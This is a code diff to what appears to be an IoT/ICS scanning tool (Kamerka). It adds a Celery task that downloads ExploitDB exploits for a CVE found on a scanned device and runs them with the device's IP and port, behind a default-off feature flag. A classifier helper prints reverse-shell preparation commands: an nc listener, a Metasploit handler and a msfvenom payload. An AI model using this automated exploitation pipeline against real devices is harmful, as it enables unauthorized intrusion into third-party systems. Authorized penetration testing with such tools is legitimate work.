@@ -2,15 +2,16 @@ import itertools
 import json
 import logging
 import math
+import os
 import re
 import shutil
+import signal
 import socket
 import subprocess
 import tempfile
 
 import maxminddb
 from libnmap.parser import NmapParser
-import os
 from time import sleep
 import requests
 from celery import shared_task, current_task
@@ -3316,12 +3317,36 @@ CVEDB_BASE = "https://cvedb.shodan.io"
 # Authoritative hostname check — prevents "evil.com/exploit-db.com/…" bypass.
 _EXPLOITDB_HOSTNAMES = {"exploit-db.com", "www.exploit-db.com"}
 
+# Trusted hostnames for exploit reference links shown in the UI.
+# Only http/https URLs with these hostnames are forwarded to the browser.
+_SAFE_REF_HOSTNAMES = {
+    "exploit-db.com",
+    "www.exploit-db.com",
+    "github.com",
+    "www.github.com",
+    "nvd.nist.gov",
+    "cve.mitre.org",
+    "packetstormsecurity.com",
+    "www.packetstormsecurity.com",
+}
+
 
 def _is_exploitdb_url(url):
     """Return True only when *url*'s hostname is exactly exploit-db.com."""
     try:
         host = urllib.parse.urlparse(url).hostname or ""
         return host in _EXPLOITDB_HOSTNAMES
+    except Exception:
+        return False
+
+
+def _is_safe_ref_url(url: str) -> bool:
+    """Return True only for http/https URLs whose hostname is in
+    ``_SAFE_REF_HOSTNAMES``.  Prevents javascript: and other dangerous
+    schemes from reaching the browser."""
+    try:
+        parsed = urllib.parse.urlparse(url)
+        return parsed.scheme in ("http", "https") and (parsed.hostname or "") in _SAFE_REF_HOSTNAMES
     except Exception:
         return False
 
@@ -4166,3 +4191,459 @@ def capture_screenshot(self, device_id):
     except Exception as e:
         logger.warning("Screenshot capture error for %s: %s", device.ip, e)
         return {"error": "Screenshot failed: {}".format(str(e))}
+
+
+# ---------------------------------------------------------------------------
+# CVE Exploit — search, download and execute an ExploitDB exploit for a CVE
+# ---------------------------------------------------------------------------
+
+# Regex for a valid CVE ID — allows any number of digits after the year
+_CVE_RE = re.compile(r'^CVE-\d{4}-\d+$', re.IGNORECASE)
+
+# Maximum bytes of exploit output stored in the database
+_MAX_EXPLOIT_OUTPUT_SIZE = 8192
+
+# Mapping of shebang tokens → interpreter binary.
+# "python" is intentionally kept as "python" so we can try python3 → python →
+# python2 at runtime rather than silently forcing python3.
+_SHEBANG_MAP = {
+    "python3": "python3",
+    "python2": "python2",
+    "python":  "python",   # resolved with fallback in _resolve_interpreter
+    "ruby":    "ruby",
+    "perl":    "perl",
+    "bash":    "bash",
+    "sh":      "sh",
+}
+
+
+def _interpreter_for(source: str) -> str:
+    """Detect interpreter from the shebang of *source*.  Returns 'python3' as fallback.
+
+    For a generic ``python`` shebang the caller should use
+    ``_resolve_interpreter`` which tries python3 first, then python/python2.
+    """
+    first = source.lstrip().split("\n", 1)[0] if source else ""
+    if first.startswith("#!"):
+        # Check more-specific tokens before generic ones (python3 before python)
+        for token in ("python3", "python2", "python", "ruby", "perl", "bash", "sh"):
+            if token in first:
+                return _SHEBANG_MAP[token]
+    # Heuristic: Ruby Metasploit modules use require 'msf/core'
+    if "require 'msf/core'" in source or 'require "msf/core"' in source:
+        return "ruby"
+    return "python3"
+
+
+def _resolve_interpreter(interpreter: str) -> str | None:
+    """Return the full path to *interpreter*, trying python3 → python → python2
+    for the generic ``python`` case.  Returns ``None`` if nothing is found."""
+    if interpreter == "python":
+        return (
+            shutil.which("python3")
+            or shutil.which("python")
+            or shutil.which("python2")
+        )
+    return shutil.which(interpreter)
+
+
+def _classify_exploit(title: str, description: str = "", msf_module: str = "") -> dict:
+    """Analyse exploit title/description and return type, requirements, and preparation steps.
+
+    Returns a dict with:
+      ``exploit_type``   – human-readable category string
+      ``requirements``   – list of requirement dicts, each with ``icon``, ``label``, and ``detail``
+      ``preparation``    – list of plain-text preparation step strings
+    """
+    combined = " ".join([title, description, msf_module]).lower()
+
+    exploit_type = "Unknown"
+    requirements = []
+    preparation = []
+
+    # ------------------------------------------------------------------ #
+    # 1. Classify the primary exploit category                            #
+    # ------------------------------------------------------------------ #
+    if any(x in combined for x in [
+        "reverse shell", "reverse_tcp", "reverse_https", "reverse_http",
+        "shell/reverse", "meterpreter", "stageless",
+    ]):
+        exploit_type = "Remote Code Execution — Reverse Shell"
+        requirements.append({
+            "icon": "🎧",
+            "label": "Netcat / Metasploit listener required",
+            "detail": "Start a listener on your machine before running the exploit.",
+        })
+        preparation.append("nc -lvnp 4444")
+        preparation.append("# OR via Metasploit:")
+        preparation.append("msfconsole -x \"use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LHOST <your-ip>; set LPORT 4444; run\"")
+
+    elif any(x in combined for x in ["bind shell", "bind_tcp"]):
+        exploit_type = "Remote Code Execution — Bind Shell"
+        requirements.append({
+            "icon": "🔌",
+            "label": "Connect to target after exploit",
+            "detail": "The exploit opens a listening shell on the target; connect after execution.",
+        })
+        preparation.append("# After exploit runs, connect with:")
+        preparation.append("nc <target-ip> <bind-port>")
+
+    elif any(x in combined for x in [
+        "remote code execution", "rce", "command execution", "code exec",
+        "arbitrary command", "os command", "command injection",
+    ]):
+        exploit_type = "Remote Code Execution"
+        requirements.append({
+            "icon": "💻",
+            "label": "Remote command execution on target",
+            "detail": "The exploit will execute arbitrary commands on the target host.",
+        })
+
+    elif any(x in combined for x in [
+        "privilege escalation", "privesc", "local privilege", "lpe",
+    ]):
+        exploit_type = "Privilege Escalation"
+        requirements.append({
+            "icon": "🔓",
+            "label": "Existing local access required",
+            "detail": "You must already have a low-privileged shell on the target before running this exploit.",
+        })
+
+    elif any(x in combined for x in [
+        "local file inclusion", "directory traversal", "path traversal",
+        "lfi", "file disclosure", "file read", "arbitrary file read",
+        "information disclosure",
+    ]):
+        exploit_type = "File Read / Information Disclosure"
+        requirements.append({
+            "icon": "📂",
+            "label": "Reads files from target filesystem",
+            "detail": "Results will contain file contents (e.g. /etc/passwd, config files).",
+        })
+
+    elif any(x in combined for x in [
+        "sql injection", "sqli", "blind sql",
+    ]):
+        exploit_type = "SQL Injection"
+        requirements.append({
+            "icon": "🗃️",
+            "label": "Extracts database contents",
+            "detail": "The exploit will dump database records from the target.",
+        })
+
+    elif any(x in combined for x in [
+        "denial of service", "crash", "reboot", "memory corruption",
+    ]) or re.search(r'\bdos\b', combined):
+        exploit_type = "Denial of Service"
+        requirements.append({
+            "icon": "💥",
+            "label": "Crashes or disrupts the target",
+            "detail": "Running this exploit may cause the target service to crash or become unavailable.",
+        })
+
+    elif any(x in combined for x in [
+        "buffer overflow", "heap overflow", "stack overflow", "integer overflow",
+        "use after free", "heap spray",
+    ]):
+        exploit_type = "Memory Corruption"
+        requirements.append({
+            "icon": "🧠",
+            "label": "Memory corruption exploit",
+            "detail": "May result in RCE or crash depending on target conditions.",
+        })
+
+    else:
+        requirements.append({
+            "icon": "⚠️",
+            "label": "Review exploit code before running",
+            "detail": "Exploit type could not be determined automatically.",
+        })
+
+    # ------------------------------------------------------------------ #
+    # 2. Secondary requirement flags (can stack onto any primary type)    #
+    # ------------------------------------------------------------------ #
+    if any(x in combined for x in [
+        "file upload", "arbitrary file upload", "unrestricted upload",
+    ]):
+        requirements.append({
+            "icon": "📤",
+            "label": "File upload to target required",
+            "detail": "The exploit will upload a payload file to the target.",
+        })
+        preparation.append("# Prepare a payload file (e.g. via msfvenom):")
+        preparation.append("msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f elf -o payload.elf")
+
+    if any(x in combined for x in [
+        "credential", "password", "username", "default credentials",
+        "authentication bypass", "auth bypass", "backdoor",
+    ]):
+        requirements.append({
+            "icon": "🔑",
+            "label": "Credential / authentication related",
+            "detail": "The exploit may expose, bypass, or reset credentials on the target.",
+        })
+
+    if any(x in combined for x in [
+        "wget", "curl", "download", "fetch", "http request",
+    ]):
+        requirements.append({
+            "icon": "📥",
+            "label": "Target fetches a remote resource",
+            "detail": "Ensure the attacker host is reachable from the target network.",
+        })
+
+    if msf_module:
+        requirements.append({
+            "icon": "🔫",
+            "label": "Metasploit module available",
+            "detail": "use {}".format(msf_module),
+        })
+        if "use {}".format(msf_module) not in preparation:
+            preparation.append("# Run via Metasploit:")
+            preparation.append("msfconsole -x \"use {}; set RHOSTS <target-ip>; run\"".format(msf_module))
+
+    return {
+        "exploit_type": exploit_type,
+        "requirements": requirements,
+        "preparation": preparation,
+    }
+
+
+def _download_exploitdb(edb_id: str) -> str | None:
+    """Download raw exploit source from ExploitDB.  Returns content or None on error."""
+    # Only numeric IDs are valid
+    if not str(edb_id).strip().isdigit():
+        return None
+    url = "https://www.exploit-db.com/download/{}".format(str(edb_id).strip())
+    try:
+        resp = requests.get(url, timeout=20, headers={"User-Agent": "Kamerka/1.0"})
+        if resp.status_code == 200 and resp.text:
+            return resp.text
+    except Exception as exc:
+        logger.warning("ExploitDB download failed for id %s: %s", edb_id, exc)
+    return None
+
+
+@shared_task(bind=True)
+def run_cve_exploit(self, device_id: int, cve_id: str):
+    """Search, download and execute an ExploitDB exploit for *cve_id* against *device_id*.
+
+    Workflow
+    --------
+    1. Check that exploit execution is enabled via ``KAMERKA_EXPLOIT_EXECUTION_ENABLED``.
+    2. Validate the CVE ID format.
+    3. Look up the VulnIntelligence record for this device + CVE to obtain
+       stored ``exploit_refs`` (ExploitDB URLs / IDs).
+    4. For each ref, download the raw exploit source from exploit-db.com.
+    5. Detect the interpreter via shebang.
+    6. Write the source to a secure temp file and execute it with the target
+       IP and port as the first two positional arguments.  The process is
+       started in its own session (new process group) so that the entire
+       process tree can be cleanly killed on timeout.
+    7. Save the combined stdout/stderr output to ``Device.exploit`` and set
+       ``Device.exploited_scanned = True``.
+
+    Returns a dict with keys ``status``, ``output``, ``cve_id``, and ``exploit_url``.
+    """
+    from django.conf import settings as _settings
+
+    progress_recorder = ProgressRecorder(self)
+    progress_recorder.set_progress(0, 4, description="Validating…")
+
+    # ------------------------------------------------------------------
+    # 0. Feature-flag gate — must be explicitly enabled
+    # ------------------------------------------------------------------
+    if not getattr(_settings, "KAMERKA_EXPLOIT_EXECUTION_ENABLED", False):
+        return {
+            "status": "disabled",
+            "output": (
+                "Exploit execution is disabled. Set the environment variable "
+                "KAMERKA_EXPLOIT_EXECUTION_ENABLED=true on a dedicated, "
+                "isolated host to enable it."
+            ),
+        }
+
+    # ------------------------------------------------------------------
+    # 1. Validate CVE ID
+    # ------------------------------------------------------------------
+    if not cve_id or not _CVE_RE.match(cve_id.strip()):
+        return {"status": "error", "output": "Invalid CVE ID: {}".format(cve_id)}
+
+    cve_id = cve_id.strip().upper()
+
+    # ------------------------------------------------------------------
+    # 2. Look up device and VulnIntelligence
+    # ------------------------------------------------------------------
+    try:
+        device = Device.objects.get(id=device_id)
+    except Device.DoesNotExist:
+        return {"status": "error", "output": "Device {} not found.".format(device_id)}
+
+    ip = device.ip
+    # device.port may store a comma-separated list (e.g. "80,443,8080") — use the first
+    primary_port = str(device.port).strip().split(",")[0].strip() if device.port else ""
+    if not primary_port:
+        return {"status": "error", "output": "Device {} has no port configured.".format(device_id)}
+
+    progress_recorder.set_progress(1, 4, description="Looking up exploit refs…")
+
+    vi = VulnIntelligence.objects.filter(device=device, cve_id__iexact=cve_id).first()
+
+    exploit_refs = []
+    if vi and vi.exploit_refs:
+        try:
+            exploit_refs = json.loads(vi.exploit_refs)
+        except (json.JSONDecodeError, TypeError):
+            exploit_refs = []
+
+    if not exploit_refs:
+        # No exploit refs stored yet — try a quick searchsploit lookup
+        searchsploit_bin = shutil.which("searchsploit")
+        if searchsploit_bin:
+            try:
+                result = subprocess.run(
+                    [searchsploit_bin, "--cve", cve_id, "-j"],
+                    capture_output=True,
+                    text=True,
+                    timeout=30,
+                )
+                if result.returncode == 0 and result.stdout:
+                    ss_data = json.loads(result.stdout)
+                    for exp in ss_data.get("RESULTS_EXPLOIT", []):
+                        edb_id = exp.get("EDB-ID", "")
+                        title = exp.get("Title", "Unknown")
+                        if edb_id:
+                            exploit_refs.append({
+                                "url": "https://www.exploit-db.com/exploits/{}".format(edb_id),
+                                "title": title,
+                                "edb_id": str(edb_id),
+                            })
+            except Exception as exc:
+                logger.warning("searchsploit lookup failed for %s: %s", cve_id, exc)
+
+    if not exploit_refs:
+        msg = "No ExploitDB references found for {}. Run ExploitDB Search first.".format(cve_id)
+        return {"status": "not_found", "output": msg, "cve_id": cve_id}
+
+    progress_recorder.set_progress(2, 4, description="Downloading exploit…")
+
+    # ------------------------------------------------------------------
+    # 3 & 4. Download and execute the first available exploit
+    # ------------------------------------------------------------------
+    last_error = "No exploit could be executed."
+    for ref in exploit_refs:
+        edb_id = ref.get("edb_id", "")
+        exploit_url = ref.get("url", "")
+
+        # Derive edb_id from URL if not stored directly
+        if not edb_id and exploit_url:
+            m = re.search(r"/(\d+)(?:/|$)", exploit_url)
+            if m:
+                edb_id = m.group(1)
+
+        if not edb_id:
+            continue
+
+        source = _download_exploitdb(edb_id)
+        if not source:
+            last_error = "Could not download exploit {} from ExploitDB.".format(edb_id)
+            continue
+
+        interpreter = _interpreter_for(source)
+        interp_bin = _resolve_interpreter(interpreter)
+        if not interp_bin:
+            last_error = "Interpreter '{}' not found on this system.".format(interpreter)
+            continue
+
+        progress_recorder.set_progress(3, 4, description="Executing exploit {}…".format(edb_id))
+
+        tmp_path = None
+        try:
+            # Write source to a secure temporary file.
+            # NamedTemporaryFile creates the file with mode 0600 on Linux,
+            # so no additional chmod is needed (and avoids a TOCTOU race).
+            _INTERP_EXT = {
+                "python3": ".py", "python": ".py", "python2": ".py",
+                "ruby": ".rb", "perl": ".pl",
+                "bash": ".sh", "sh": ".sh",
+            }
+            suffix = _INTERP_EXT.get(interpreter, ".py")
+            with tempfile.NamedTemporaryFile(
+                mode="w",
+                suffix=suffix,
+                delete=False,
+                prefix="kamerka_exploit_",
+                dir=tempfile.gettempdir(),
+            ) as tmp:
+                tmp.write(source)
+                tmp_path = tmp.name
+
+            # start_new_session=True places the child in a new process group
+            # so that all its descendants can be cleanly killed on timeout.
+            proc = subprocess.Popen(
+                [interp_bin, tmp_path, ip, primary_port],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                start_new_session=True,
+            )
+            # Cache the process group ID immediately after Popen to avoid a
+            # PID-reuse race between getpgid() and killpg() at timeout time.
+            try:
+                pgid = os.getpgid(proc.pid)
+            except OSError:
+                pgid = None
+            try:
+                stdout, stderr = proc.communicate(timeout=60)
+            except subprocess.TimeoutExpired:
+                # Kill the entire process group, not just the direct child
+                if pgid is not None:
+                    try:
+                        os.killpg(pgid, signal.SIGKILL)
+                    except OSError:
+                        proc.kill()
+                else:
+                    proc.kill()
+                proc.wait()
+                raise
+
+            combined = (stdout or "") + (stderr or "")
+            combined = combined.strip() or "(no output)"
+
+            result_dict = {
+                "status":      "executed",
+                "cve_id":      cve_id,
+                "exploit_url": exploit_url,
+                "edb_id":      edb_id,
+                "interpreter": interpreter,
+                "returncode":  proc.returncode,
+                "output":      combined[:_MAX_EXPLOIT_OUTPUT_SIZE],
+            }
+
+            device.exploit = json.dumps(result_dict)
+            device.exploited_scanned = True
+            device.save()
+
+            progress_recorder.set_progress(4, 4, description="Done")
+            return result_dict
+
+        except subprocess.TimeoutExpired:
+            last_error = "Exploit {} timed out after 60 seconds.".format(edb_id)
+            logger.warning("Exploit %s timed out for device %s", edb_id, device_id)
+        except Exception as exc:
+            last_error = "Exploit {} execution error: {}".format(edb_id, str(exc))
+            logger.warning("Exploit %s error for device %s: %s", edb_id, device_id, exc)
+        finally:
+            if tmp_path and os.path.exists(tmp_path):
+                try:
+                    os.unlink(tmp_path)
+                except OSError:
+                    pass
+
+    # All refs tried and failed
+    device.exploit = json.dumps({"status": "failed", "cve_id": cve_id, "output": last_error})
+    device.exploited_scanned = True
+    device.save()
+
+    progress_recorder.set_progress(4, 4, description="Done")
+    return {"status": "failed", "cve_id": cve_id, "output": last_error}
